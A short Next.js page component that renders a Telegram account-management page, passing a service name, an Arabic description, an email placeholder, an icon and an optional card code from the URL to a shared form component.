import { FaTelegramPlane } from "react-icons/fa";
import AccountServicePage from "@/components/forms/AccountServicePage";

export default async function TelegramPage({
  searchParams,
}: {
  searchParams: Promise<{ card?: string }>;
}) {
  const { card } = await searchParams;

  return (
    <AccountServicePage
      service="Telegram"
      title="Telegram"
      description="إدارة بيانات حساب Telegram بأمان"
      emailPlaceholder="example@gmail.com"
      icon={<FaTelegramPlane size={58} className="text-sky-400" />}
      cardCode={card || null}
    />
  );
}